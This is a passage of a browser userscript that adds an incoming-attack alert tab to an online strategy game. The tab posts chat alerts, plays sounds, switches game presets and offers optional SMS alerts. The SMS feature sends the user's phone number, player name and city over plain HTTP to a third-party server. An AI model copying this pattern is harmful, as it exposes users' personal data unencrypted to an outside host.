        92: { 'country': "UNITED STATES", 'provider': "Nextel" },
        93: { 'country': "UNITED STATES", 'provider': "O2" },
        94: { 'country': "UNITED STATES", 'provider': "Orange" },
        95: { 'country': "UNITED STATES", 'provider': "Qwest" },
        96: { 'country': "UNITED STATES", 'provider': "Rogers Wireless" },
        97: { 'country': "UNITED STATES", 'provider': "Telus Mobility" },
        98: { 'country': "UNITED STATES", 'provider': "US Cellular" },
        99: { 'country': "UNITED STATES", 'provider': "Verizon" },
        100: { 'country': "UNITED STATES", 'provider': "Virgin Mobile" },
        101: { 'country': "UNITED KINGDOM", 'provider': "O2 1" },
        102: { 'country': "UNITED KINGDOM", 'provider': "O2 2" },
        103: { 'country': "UNITED KINGDOM", 'provider': "Orange" },
        104: { 'country': "UNITED KINGDOM", 'provider': "T-Mobile" },
        105: { 'country': "UNITED KINGDOM", 'provider': "Virgin Mobile" },
        106: { 'country': "UNITED KINGDOM", 'provider': "Vodafone" },
        107: { 'country': "BELGIUM", 'provider': "mobistar" },
        108: { 'country': "GERMANY", 'provider': "1und1" },
        109: { 'country': "UNITED STATES", 'provider': "MyCricket" },
        110: { 'country': "Philippines", 'provider': "Smart" },
        111: { 'country': "UNITED STATES", 'provider': "CellularSouth" },
        112: { 'country': "UNITED STATES", 'provider': "Viaero" },
        113: { 'country': "CANADA", 'provider': "Wind Mobile" }
    },

  init: function(div){
    var t = Tabs.tower;
    t.myDiv = div;
    if (GM_getValue ('towerMarches_'+getServerId()) != null)
      GM_deleteValue ('towerMarches_'+getServerId());   // remove deprecated data if it exists
    // t.generateIncomingFunc = new CalterUwFunc ('attack_generateincoming', [[/.*} else {\s*e = true;\s*}/im, '} else { e = ptGenerateIncoming_hook(); }']]);
    // unsafeWindow.ptGenerateIncoming_hook = t.generateIncoming_hook;
 
    var m = '<DIV class=pbStat>TOWER ALERTS</div><TABLE class=pbTab><TR align=center>';

      for (var i=0; i<Cities.cities.length; i++)
      m += '<TD width=95><SPAN id=pbtacity_'+ i +'>' + Cities.cities[i].name + '</span></td>';
    m += '</tr><TR align=center>';
      for (var cityId in Cities.byID)
        m += '<TD><INPUT type=submit id=pbtabut_'+ cityId +' value=""></td>';
    m += '</tr><TR align=center>';
      for (var cityId in Cities.byID)
       m += '<TD><CENTER><INPUT id=pbattackqueue_' + cityId + ' type=submit value="A 0 | S 0"></center></td>';
    m += '</tr></table><BR><DIV><CENTER><INPUT id=pbSoundStop type=submit value="'+translate("Stop Sound Alert")+'"></center></div><DIV id=pbSwfPlayer></div>';
    m += '<BR><DIV class=pbStat>'+translate("SETUP")+'</div><TABLE class=pbTab>\
    <tr><td align=left><INPUT id=pbcellenable type=checkbox '+ (Options.celltext.atext?'CHECKED ':'') +'/></td>\
    <td align=left>'+translate("Text message incoming attack to")+': <INPUT id=pbnum1 type=text size=4 maxlength=4 value="'+ Options.celltext.num1 +'"  '+(Options.celltext.provider==0?'DISABLED':'')+'\>\
&nbsp;<INPUT id=pbnum2 type=text size=3 maxlength=3 value="'+ Options.celltext.num2 +'"  '+(Options.celltext.provider==0?'DISABLED':'')+'\>\
&nbsp;<INPUT id=pbnum3 type=text size=4 maxlength=4 value="'+ Options.celltext.num3 +'"  '+(Options.celltext.provider==0?'DISABLED':'')+'\> <span style="color:#800; font-weight:bold"><sup>*'+translate("Standard text messaging rates apply")+'</sup></span></td></tr><tr><td></td>\
    <TD align=left>'+translate("Country")+': <select id="pbfrmcountry">';
    for (var i in t.Providers) {
       var ret=m.indexOf(t.Providers[i].country);
       if (ret==-1) {
         if(t.Providers[Options.celltext.provider]){
			 if (t.Providers[i].country==t.Providers[Options.celltext.provider].country) {
			   m += '<option value="'+t.Providers[i].country+'" selected="selected">'+t.Providers[i].country+'</option>'; // Load Previous Provider Selection
			 } else {
			   m += '<option value="'+t.Providers[i].country+'">'+t.Providers[i].country+'</option>';
			 }
         } else {
           m += '<option value="'+t.Providers[i].country+'">'+t.Providers[i].country+'</option>';
         }
       }
    }
    
    m += '</select>\
    <select id="pbfrmprovider" '+(Options.celltext.provider==0?'DISABLED':'')+'><option value=0 >--'+translate("Provider")+'--</option>';
    for (var i in t.Providers) {
         if(t.Providers[Options.celltext.provider]){
			if(t.Providers[i].country == t.Providers[Options.celltext.provider].country)
				if(Options.celltext.provider == i)
					m += '<option value="'+i+'" selected="selected">'+t.Providers[i].provider+'</option>'; // Load Previous Provider Selection
				else {
				   m += '<option value="'+i+'">'+t.Providers[i].provider+'</option>';
				}
		 } else {
		   m += '<option value="'+i+'">'+t.Providers[i].provider+'</option>';
		 }
    }

    m += '</select></td></tr>';
    m += '<TR><td align=center>-</td><TD align=left>'+translate("Minimum # of troops to trigger tower options")+':<INPUT id=pbalertTroops type=text size=7 value="'+ Options.alertConfig.minTroops +'" \> <span style="color:#800; font-weight:bold"><sup>*NEW! Controls All Tower Options</sup></span></td></tr>';

    m += '<TR><TD><INPUT id=pbalertEnable type=checkbox '+ (Options.alertConfig.aChat?'CHECKED ':'') +'/></td><TD>'+translate("Automatically post incoming attacks to alliance chat")+'.</td></tr>\
        <TR><TD></td><TD><TABLE cellpadding=0 cellspacing=0>\
            <TR><TD align=right>'+translate("Message Prefix")+': &nbsp; </td><TD><INPUT id=pbalertPrefix type=text size=60 maxlength=120 value="'+ Options.alertConfig.aPrefix +'" \></td></tr>\
            <TR><TD align=right>'+translate("Alert on scouting")+': &nbsp; </td><TD><INPUT id=pbalertScout type=checkbox '+ (Options.alertConfig.scouting?'CHECKED ':'') +'/></td></tr>\
            <TR><TD align=right>'+translate("Alert on wild attack")+': &nbsp; </td><TD><INPUT id=pbalertWild type=checkbox '+ (Options.alertConfig.wilds?'CHECKED ':'') +'/></td></tr>\
            <TR><TD align=right>'+translate("Display defend status")+': &nbsp; </td><TD><INPUT id=pbalertDefend type=checkbox '+ (Options.alertConfig.defend?'CHECKED ':'') +'/></td></tr>\
            </table></td></tr>\
        <TR><TD align=right><INPUT id=pbalertraid type=checkbox '+ (Options.alertConfig.raid?'CHECKED':'') +'/></td><TD>'+translate("Stop raids on impending")+'.</td></tr>\
    <TR><TD align=right><INPUT id=pbalertTR type=checkbox '+ (Options.alertConfig.alertTR?'CHECKED ':'') +'/></td><TD> '+translate("Toggle to TR set ")+' <INPUT id=pbalertTRset type=text size=2 maxlength=1 value="'+ Options.alertConfig.alertTRset +'"> '+translate("on impending")+'</td></tr>\
    <TR><TD align=right><INPUT id=pbalertTR2 type=checkbox '+ (Options.alertConfig.alertTR2?'CHECKED ':'') +'/></td><TD> '+translate("Toggle to TR set ")+' <INPUT id=pbalertTRset2 type=text size=2 maxlength=1 value="'+ Options.alertConfig.alertTRset2 +'"> '+translate("after")+' <INPUT id=pbalertTRsetmin type=text size=3 maxlength=3 value="'+ Options.alertConfig.alertTRsetwaittime +'"> '+translate("minutes without incoming attack")+'</td></tr>\
       <TR><TD><BR></td></tr>\
        <TR><TD><INPUT id=pbSoundEnable type=checkbox '+ (Options.alertSound.enabled?'CHECKED ':'') +'/></td><TD>'+translate("Play sound on incoming attack/scout")+'</td></tr>\
        <TR><TD></td><TD><DIV id=pbLoadingSwf>'+translate("Loading SWF player")+'</div><DIV style="display:none" id=pbSoundOpts><TABLE cellpadding=0 cellspacing=0>\
            <TR><TD align=right>'+translate("Sound file")+': &nbsp; </td><TD><INPUT id=pbsoundFile type=text size=40 maxlength=1000 value="'+ Options.alertSound.soundUrl +'" \>\
             &nbsp; </td><TD><INPUT id=pbSoundLoad type=submit value='+translate("Load")+' ><INPUT id=pbSoundDefault type=submit value='+translate("Default")+' ></td></tr>\
            <TR><TD align=right>'+translate("Volume")+': &nbsp; </td><TD><TABLE cellpadding=0 cellspacing=0 class=pbTab><TR valign=middle><TD><SPAN id=pbVolSlider></span></td><TD width=15></td><TD align=right id=pbVolOut>0</td></td></table></td><TD align=center><SPAN id=pbLoadStat>xx</span></td></tr>\
            <TR><TD align=right><INPUT id=pbSoundRepeat type=checkbox '+ (Options.alertSound.repeat?'CHECKED ':'') +'/></td><TD> '+translate("Repeat every")+' <INPUT id=pbSoundEvery type=text size=2 maxlength=5 value="'+ Options.alertSound.repeatDelay +'"> '+translate("minutes")+'</td></tr>\
            <TR><TD></td><TD>Play for <INPUT id=pbSoundLength type=text size=3 maxlength=5 value="'+ Options.alertSound.playLength +'"> '+translate("seconds")+'</td></tr>\
            <TR><TD></td><TD><INPUT type=submit value="'+translate("Play Now")+'" id=pbPlayNow></td></tr></table></div></td></tr>\
        </table><BR>';
      t.myDiv.innerHTML = m;


//   t.mss = new CmatSimpleSound(SWF_PLAYER_URL, null, {height:36, width:340}, t.e_swfLoaded, 'debug=y');
    t.mss = new CmatSimpleSound(SWF_PLAYER_URL, null, {height:0, width:0}, t.e_swfLoaded, 'debug=n');
    //t.mss.swfDebug = function (m){ logit ('SWF: '+ m)};
    t.mss.swfPlayComplete = t.e_soundFinished;
    t.mss.swfLoadComplete = t.e_soundFileLoaded;
    unsafeWindow.matSimpleSound01 = t.mss;   // let swf find it

    t.volSlider = new SliderBar (document.getElementById('pbVolSlider'), 200, 21, 0);
    t.volSlider.setChangeListener(t.e_volChanged);
    document.getElementById('pbPlayNow').addEventListener ('click', function (){t.playSound(false)}, false);
    document.getElementById('pbSoundStop').addEventListener ('click', t.stopSoundAlerts, false);
    document.getElementById('pbSoundRepeat').addEventListener ('change', function (e){Options.alertSound.repeat = e.target.checked}, false);
    document.getElementById('pbSoundEvery').addEventListener ('change', function (e){Options.alertSound.repeatDelay = e.target.value}, false);
    document.getElementById('pbSoundLength').addEventListener ('change', function (e){Options.alertSound.playLength = e.target.value}, false);
    document.getElementById('pbSoundEnable').addEventListener ('change', function (e){Options.alertSound.enabled = e.target.checked}, false);
    document.getElementById('pbcellenable').addEventListener ('change', function (e){Options.celltext.atext = e.target.checked;}, false);
    document.getElementById('pbSoundStop').disabled = true;
    document.getElementById('pbalertEnable').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertPrefix').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertScout').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertWild').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertDefend').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertTroops').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbfrmcountry').addEventListener ('change', t.setCountry, false);
    document.getElementById('pbfrmprovider').addEventListener ('change', t.setProvider, false);
    document.getElementById('pbnum1').addEventListener ('change', t.phonenum, false);
    document.getElementById('pbnum2').addEventListener ('change', t.phonenum, false);
    document.getElementById('pbnum3').addEventListener ('change', t.phonenum, false);
    document.getElementById('pbalertraid').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertTR').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertTRset').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertTR2').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertTRset2').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbalertTRsetmin').addEventListener ('change', t.e_alertOptChanged, false);
    document.getElementById('pbsoundFile').addEventListener ('change', function (){
        Options.alertSound.soundUrl = document.getElementById('pbsoundFile').value;
        t.loadUrl (Options.alertSound.soundUrl);
      }, false);
    document.getElementById('pbSoundDefault').addEventListener ('click', function (){
        document.getElementById('pbsoundFile').value = DEFAULT_ALERT_SOUND_URL;
        Options.alertSound.soundUrl = DEFAULT_ALERT_SOUND_URL;
        t.loadUrl (DEFAULT_ALERT_SOUND_URL);
      }, false);

    for (var cityId in Cities.byID){
        var but = document.getElementById ('pbtabut_'+ cityId);
        addListener (but, cityId);
        t.defMode[cityId] =  parseInt(Seed.citystats["city" + cityId].gate);
        t.displayDefMode (cityId);
      var btnNameT = 'pbattackqueue_' + cityId;
      addTowerEventListener(cityId, btnNameT);
      }
    function addListener (but, i){
      but.addEventListener ('click', function (){t.butToggleDefMode(i)}, false);
    }
    function addTowerEventListener(cityId, name){
        document.getElementById(name).addEventListener('click', function(){
            t.showTowerIncoming(cityId);
        }, false);
    }    
    setInterval (t.eachSecond, 2000);
  },      

  show : function (){
  },
  
  hide : function (){
  },
 
  loadUrl : function (url){
    var t = Tabs.tower;
    t.mss.load (1, url, true);
    document.getElementById('pbLoadStat').innerHTML = translate('Loading');
  },
  phonenum : function() {
   Options.celltext.num1 = document.getElementById('pbnum1').value;
   Options.celltext.num2 = document.getElementById('pbnum2').value;
   Options.celltext.num3 = document.getElementById('pbnum3').value;
   saveOptions();
  },

  setCountry : function(){
    var t = Tabs.tower;
    var myselect=document.getElementById("pbfrmprovider");
    myselect.innerHTML = '<option value=0 >--'+translate("Provider")+'--</option>';
    myselect.disabled = true;
    for (var i in t.Providers) {
     if (t.Providers[i].country == document.getElementById("pbfrmcountry").value){
        var addoption = document.createElement('option');
        addoption.value = i;
        addoption.text = t.Providers[i].provider;
      myselect.add(addoption, null) //add new option to end of "Providers"
     }
    }
    myselect.disabled = false;
   },

  setProvider : function(){
    var ddProvider = document.getElementById("pbfrmprovider").wrappedJSObject;
     Options.celltext.provider=ddProvider.options[ddProvider.selectedIndex].value;
    if(ddProvider.selectedIndex > 0){
        document.getElementById("pbnum1").disabled = false;
        document.getElementById("pbnum2").disabled = false;
        document.getElementById("pbnum3").disabled = false;
    } else {
        document.getElementById("pbnum1").disabled = true;
        document.getElementById("pbnum2").disabled = true;
        document.getElementById("pbnum3").disabled = true;
    }
    //alert(Options.celltext.provider);
   },

  e_swfLoaded : function (){
    var t = Tabs.tower;
    document.getElementById('pbLoadingSwf').style.display = 'none';
    document.getElementById('pbSoundOpts').style.display = 'inline';
    t.volSlider.setValue (Options.alertSound.volume/100);
    t.loadUrl (Options.alertSound.soundUrl);
    setTimeout (function (){t.mss.setVolume (1, Options.alertSound.volume);}, 500);
    if (Options.alertSound.alarmActive && Options.alertSound.expireTime>unixTime())   
      t.soundTheAlert();
  },
  
  e_alertOptChanged : function (){
    var t = Tabs.tower;
    Options.alertConfig.aChat = document.getElementById('pbalertEnable').checked;
    Options.alertConfig.aPrefix=document.getElementById('pbalertPrefix').value;      
    Options.alertConfig.scouting=document.getElementById('pbalertScout').checked;      
    Options.alertConfig.wilds=document.getElementById('pbalertWild').checked;
    Options.alertConfig.defend=document.getElementById('pbalertDefend').checked;
    Options.alertConfig.raid=document.getElementById('pbalertraid').checked;
    Options.alertConfig.alertTR=document.getElementById('pbalertTR').checked;
    Options.alertConfig.alertTR2=document.getElementById('pbalertTR2').checked;
    var trset = parseInt(document.getElementById('pbalertTRset').value);
    Options.alertConfig.alertTRset = trset;
    var trset2 = parseInt(document.getElementById('pbalertTRset2').value);
    Options.alertConfig.alertTRset2 = trset2;
    var trsetwait = parseInt(document.getElementById('pbalertTRsetmin').value);
    Options.alertConfig.alertTRsetwaittime = trsetwait;
    var mt = parseInt(document.getElementById('pbalertTroops').value);
    if (mt<1 || mt>120000){
      document.getElementById('pbalertTroops').value = Options.alertConfig.minTroops;
      document.getElementById('pbalerterr').innerHTML = '<font color=#600000><B>'+translate("INVALID")+'</b></font>';
      setTimeout (function (){document.getElementById('pbalerterr').innerHTML =''}, 2000);
      return;
    }
    Options.alertConfig.minTroops = mt;
    saveOptions();
  },
  
  e_volChanged : function (val){
    var t = Tabs.tower;
    document.getElementById('pbVolOut').innerHTML = parseInt(val*100);
    Options.alertSound.volume = parseInt(val*100);
    t.mss.setVolume (1, Options.alertSound.volume);
  },
  
  butToggleDefMode : function (cityId){
    var t = Tabs.tower;
    var mode = 1;
    if (Seed.citystats["city" + cityId].gate != 0)
      mode = 0;
    t.ajaxSetDefMode (cityId, mode, function (newMode){
        t.defMode[cityId] = newMode;
        t.displayDefMode (cityId);
      });
  },
      
  displayDefMode : function (cityId){
    var t = Tabs.tower;
    var but = document.getElementById('pbtabut_'+ cityId);
    if (t.defMode[cityId]){
      but.className = 'pbDefButOn';
      but.value = 'Def = ON';  
    } else {
      but.className = 'pbDefButOff';
      but.value = 'Def = OFF';  
    }  
  },
    
  eachSecond : function (){
    var t = Tabs.tower;
    for (var cityId in Cities.byID){
      if (Seed.citystats["city" + cityId].gate != t.defMode[cityId]){     // user changed def mode
        t.defMode[cityId] = Seed.citystats["city"+ cityId].gate;
        t.displayDefMode (cityId);
      }
      Options.alertConfig.raidautoswitch[cityId] = false;
    }
      var now = unixTime();
    var incomming = false;
    if (matTypeof(Seed.queue_atkinc) != 'array'){
      for (var k in Seed.queue_atkinc){   // check each incoming march
        var m = Seed.queue_atkinc[k];
        if ((m.marchType==3 || m.marchType==4) && parseIntNan(m.arrivalTime)>now){
          if (m.departureTime > Options.alertConfig.lastAttack){
            Options.alertConfig.lastAttack = m.departureTime;
            t.newIncoming (m);
          }
          incomming = true;
          if (Options.alertConfig.raid){
            Options.alertConfig.raidautoswitch[m.toCityId] = true;
          }
        }
      }
    }
    if(Options.alertConfig.RecentActivity) {
		if(Options.alertConfig.alertTR2) {
			if(!incomming) {
				var switchtime = parseInt(Options.alertConfig.lastAttack)+Options.alertConfig.alertTRsetwaittime*60;
				if (switchtime < now) {
					var currentset = Seed.throne.activeSlot
					if (Options.alertConfig.alertTRset2 != currentset){
						var preset = Options.alertConfig.alertTRset2
						Tabs.Throne.doPreset(preset);
					}
					Options.alertConfig.RecentActivity = false;
					saveOptions();
				}
			}
		}
	}
	if (incomming && !document.getElementById("towersirentab") && Options.alertSound.enabled){
		AddSubTabLink('!Silence Alarm!',t.stopSoundAlerts, 'towersirentab');
		document.getElementById('towersirentab').innerHTML = '<span style="color: red">Silence Alarm!</span>';
	}
    if (Options.alertSound.alarmActive && (now > Options.alertSound.expireTime)){
	var element = document.getElementById('towersirentab');
	if(element)
		element.parentNode.removeChild(element);
	t.stopSoundAlerts();
	}

        t.towerMarches = [];
        for (var i = 0; i < Cities.cities.length; i++) {
            var cId = Cities.cities[i].id;
            t['attackCount_' + cId] = 0;
            t['scoutCount_' + cId] = 0;
        }
        if (matTypeof(Seed.queue_atkinc) != 'array') {
            for (var k in Seed.queue_atkinc) {
                var m = Seed.queue_atkinc[k];
                if ((m.marchType == 3 || m.marchType == 4) && parseIntNan(m.arrivalTime) > now) {
                    t.handleTowerData(m);

                }
            }
        }
        for (var i = 0; i < Cities.cities.length; i++) {
            var cId = Cities.cities[i].id;
            document.getElementById('pbattackqueue_' + cId).value = 'A ' + t['attackCount_' + cId] + ' | S ' + t['scoutCount_' + cId];
        }    
  },   
  
  e_soundFinished : function (chan){ // called by SWF when sound finishes playing
    var t = Tabs.tower;
    if (chan != 1)
      return;
    if (!Options.alertSound.alarmActive){
      document.getElementById('pbSoundStop').disabled = true;
    }
  },

  e_soundFileLoaded : function (chan, isError){ // called by SWF when sound file finishes loading
    if (chan != 1)
      return;
    if (isError)  
      document.getElementById('pbLoadStat').innerHTML = translate("Error")+"!";
    else
      document.getElementById('pbLoadStat').innerHTML = translate("Loaded");
  },  
  
  playSound : function (doRepeats){
    var t = Tabs.tower;
    document.getElementById('pbSoundStop').disabled = false;
    clearTimeout (t.soundStopTimer);
    clearTimeout (t.soundRepeatTimer);
    t.mss.play (1, 0);
    t.soundStopTimer = setTimeout (function(){t.mss.stop(1); t.e_soundFinished(1)}, Options.alertSound.playLength*1000);
    if (doRepeats && Options.alertSound.repeat)
      t.soundRepeatTimer = setTimeout (function (){t.playSound(true)}, Options.alertSound.repeatDelay*60000);
    else
      Options.alertSound.alarmActive = false;
  },
        
  soundTheAlert : function (){
    var t = Tabs.tower;
    Options.alertSound.alarmActive = true;
    t.playSound(true);
  },
     
  stopSoundAlerts : function (){
    var t = Tabs.tower;
    t.mss.stop (1);
    var element = document.getElementById('towersirentab');
	if(element)
		element.parentNode.removeChild(element);
    clearTimeout (t.soundStopTimer);
    clearTimeout (t.soundRepeatTimer);
    document.getElementById('pbSoundStop').disabled = true;
    Options.alertSound.alarmActive = false;
    Options.alertSound.expireTime = 0;
  },

  newIncoming : function (m){
    var t = Tabs.tower;
    var totTroops = 0;
    for (k in m.unts){
      totTroops += m.unts[k];
    }
    if (totTroops < Options.alertConfig.minTroops){
      return;
    }
    t.towerPreset (m);
  },

  towerPreset : function (m){
    var t = Tabs.tower;
    if (Options.alertConfig.alertTR){
		var currentset = Seed.throne.activeSlot
		if (Options.alertConfig.alertTRset != currentset){
            var preset = Options.alertConfig.alertTRset
            Tabs.Throne.doPreset(preset);
		}
    }  
	if(Options.alertConfig.alertTR2) {
		Options.alertConfig.RecentActivity = true;
		saveOptions();
	}
    t.postToChat (m);
  },   
  
  sendalert : function (m){
    var t = Tabs.tower;
    var now = unixTime();
    if (Options.celltext.atext)
      t.postToCell (m);
    if (Options.alertSound.enabled){
      t.soundTheAlert(m);
      if (m.arrivalTime > Options.alertSound.expireTime)
        Options.alertSound.expireTime = m.arrivalTime;
    }
    if (Options.alertConfig.raid){
        Tabs.Raid.StopCityRaids(m.toCityId);
        Options.alertConfig.raidautoswitch[m.toCityId] = true;
    }  
  },


  ajaxSetDefMode : function (cityId, state, notify){
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.cid = cityId;
        params.state = state;
        new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/gate.php" + unsafeWindow.g_ajaxsuffix, {
            method: "post",
            parameters: params,
            onSuccess: function (rslt) {
                if (rslt.ok) {
                    Seed.citystats["city" + cityId].gate = state;
                    notify (state);
                }
            },
            onFailure: function () {
            }
        })
  },
  
  onUnload : function (){
  },



  postToCell : function (m){
    var t = Tabs.tower;
    var data = {};
    if (m.marchType == null)      // bogus march (returning scouts)
      return;
    if (m.marchType == 3){
      if (!Options.alertConfig.scouting)
        return;
      data.atkType = 'scout';
    } else if (m.marchType == 4){
      data.atkType = 'atk';
    } else {
      return;
    }
    var city = Cities.byID[m.toCityId];
    if ( city.tileId == m.toTileId )
      data.target = 'city ('+ city.x +','+ city.y+')';
    else {
      if (!Options.alertConfig.wilds)
        return;
      data.target = 'wild';
      for (k in Seed.wilderness['city'+m.toCityId]){
        if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
          data.target += Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord;
          break;
        }
      }
    }
    if (Seed.players['u'+m.pid])
      data.who = Seed.players['u'+m.pid].n;
    else if (m.players && m.players['u'+m.pid])
      data.who = m.players['u'+m.pid].n;
    else
      data.who = 'Unknown';
  
    if (m.fromXCoord)
      data.who += m.fromXCoord +','+ m.fromYCoord;
     data.arrival = unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime()));


    if ( city.tileId == m.toTileId ){
      var emb = getCityBuilding(m.toCityId, 8);
      if (emb.count > 0){
        var availSlots = emb.maxLevel;
        for (k in Seed.queue_atkinc){
          if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
            --availSlots;
          }
        }
        data.embassy = 'EMB '+ availSlots +'of'+ emb.maxLevel;
        if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
        {
            data.stat = 'HIDING';
        }
        if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
        {
            data.stat = 'DEFENDING';
        }
      }
    }
    data.provider = Options.celltext.provider;
    data.num1 = Options.celltext.num1;
    data.num2 = Options.celltext.num2;
    data.num3 = Options.celltext.num3;
    data.serverId = getServerId();
    data.player = Seed.player['name'];
    data.city = city.name;

  GM_xmlhttpRequest({
    method: 'POST',
    url: 'http://hs151.digitalweb.net/index.php',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    },
    data: implodeUrlArgs(data),

    })
  },
  
  postToChat : function (m){
    var t = Tabs.tower;
    if (DEBUG_TRACE) logit ("checkTower(): INCOMING at "+ unixTime()  +": \n"+ inspect (m, 8, 1));
    if (m.marchType == null)      // bogus march (returning scouts)
      return;
    if (ENABLE_TEST_TAB) Tabs.Test.addDiv (translate("Incoming")+"!<BR><PRE style='margin:0px;'>" + inspect (m, 8, 1) +'</pre>');
    var target, atkType, who;
    if (m.marchType == 3){
      if (!Options.alertConfig.scouting)
        return;
      atkType = translate('scouted');
    } else if (m.marchType == 4){
      atkType = translate("attacked");
    } else {
      return;
    }
    var city = Cities.byID[m.toCityId];
    if ( city.tileId == m.toTileId )
      target = translate('city at')+' ('+ city.x +','+ city.y + ')';
    else {
      if (!Options.alertConfig.wilds)
        return;
      target = translate('wilderness');
      for (k in Seed.wilderness['city'+m.toCityId]){
        if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
          target += ' at ('+ Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord + ')';
          break;
        }
      }
    }
    if (Seed.players['u'+m.pid])
      who = Seed.players['u'+m.pid].n;
    else if (m.players && m.players['u'+m.pid])
      who = m.players['u'+m.pid].n;
    else
      who = translate('Unknown');
  
    if (m.fromXCoord)
      who += ' at ('+ m.fromXCoord +','+ m.fromYCoord + ')';
    who += ' ('+getDiplomacy(m.aid)+')';
    
    var msg = Options.alertConfig.aPrefix +' ';
    if(m.marchStatus == 9)
        msg += 'The '+ atkType +' on my '+ target +' by '+ who +' has been recalled.';
    else
        msg += 'My '+ target +' is being '+ atkType  +' by '+ who +' Incoming Troops (arriving in '+ unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +') : ';
    for (k in m.unts){
      var uid = parseInt(k.substr (1));
      msg += m.unts[k] +' '+ unsafeWindow.unitcost['unt'+uid][0] +', ';
    }
    msg = msg.slice (0, -2);
    msg += '.';
    if ( city.tileId == m.toTileId ){
      var emb = getCityBuilding(m.toCityId, 8);
      if (emb.count == 0)
      msg += translate("My embassy has not been constructed in this kingdom.  Do not attempt to reinforce.");
      else {
        var availSlots = emb.maxLevel;
        for (k in Seed.queue_atkinc){
          if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
            --availSlots;
          }
        }
        msg += ' My embassy has '+ availSlots +' of '+ emb.maxLevel +' slots available.';
        if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
        {
            msg+= ' My troops are HIDING!';
        }
        if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
        {
            msg+= ' My troops are DEFENDING!';
        }
            msg+= ' My technology levels are: Fl Lv' + parseInt(Seed.tech.tch13)
             + ', HP Lv'+ parseInt(Seed.tech.tch15)
             + ', PE Lv'+ parseInt(Seed.tech.tch8)
             + ', MA Lv'+ parseInt(Seed.tech.tch9)
             + ', MM Lv'+ parseInt(Seed.tech.tch11)
             + ', AH Lv'+ parseInt(Seed.tech.tch12);
      }
    }
    t.sendalert(m);
    if (!Options.alertConfig.aChat) return;
    if (ENABLE_TEST_TAB) Tabs.Test.addDiv (msg);
    if (SEND_ALERT_AS_WHISPER)
      sendChat ("/"+ Seed.player.name +' '+ msg);    // Whisper to myself
    else
      sendChat ("/a "+  msg);                        // Alliance chat
  },
      handleTowerData: function(m){
        var t = Tabs.tower;
        var now = unixTime();
        var target, atkType, who, attackermight, allianceId, allianceName, diplomacy;
        var city = Cities.byID[m.toCityId];
        
        if (DEBUG_TRACE)
            logit("checkTower(): INCOMING at " + unixTime() + ": \n" + inspect(m, 8, 1));
        
        //ATKTYPE
        if (m.marchType == 3) {
            atkType = 'scouted';
            t['scoutCount_' + m.toCityId]++;
        }
        else
            if (m.marchType == 4) {
                atkType = 'attacked';
                t['attackCount_' + m.toCityId]++;
            }
            else {
                return;
            }
        //TARGET
        if (city.tileId == m.toTileId)
            target = 'City at ' + city.x + ',' + city.y;
        else {
            target = 'Wilderness';
            for (k in Seed.wilderness['city' + m.toCityId]) {
                if (Seed.wilderness['city' + m.toCityId][k].tileId == m.toTileId) {
                    target += ' at ' + Seed.wilderness['city' + m.toCityId][k].xCoord + ',' + Seed.wilderness['city' + m.toCityId][k].yCoord;
                    break;
                }
            }
        }
        //CITYNAME
        var cityName = Cities.byID[m.toCityId].name;
        
        //TROOPS
        var units = [];
        for (i = 0; i < 13; i++)
            units[i] = 0;
        for (k in m.unts) {
            var uid = parseInt(k.substr(1));
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Supply Troop')
                units[1] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Militiaman')
                units[2] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Scout')
                units[3] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Pikeman')
                units[4] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Swordsman')
                units[5] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Archer')
                units[6] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Cavalry')
                units[7] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Heavy Cavalry')
                units[8] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Supply Wagon')
                units[9] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Ballista')
                units[10] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Battering Ram')
                units[11] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Catapult')
                units[12] = m.unts[k];
        }
        //ATTACKERS INFORMATION
        if (Seed.players['u' + m.pid]) {
            who = Seed.players['u' + m.pid].n;
            attackermight = Seed.players['u' + m.pid].m;
            allianceId = Seed.players['u' + m.pid].a;
            allianceName = Seed.allianceNames[allianceId];
